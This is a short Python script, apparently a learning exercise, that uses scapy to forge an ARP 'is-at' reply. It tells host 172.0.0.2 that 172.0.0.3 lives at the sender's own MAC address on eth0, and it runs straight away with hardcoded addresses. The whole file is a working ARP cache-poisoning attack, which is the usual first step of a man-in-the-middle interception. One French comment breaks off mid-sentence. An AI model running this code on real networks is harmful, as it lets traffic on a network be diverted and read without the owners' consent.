from scapy.all import *

def send_spoofed_arp(target_ip, spoofed_ip, interface):
    hw = get_if_hwaddr(interface)
    arp_response = ARP(pdst=target_ip, psrc=spoofed_ip, hwsrc=hw, op="is-at") # op peut etre soit 
    send(arp_response, iface=interface)
    pass

send_spoofed_arp("172.0.0.2", "172.0.0.3", "eth0")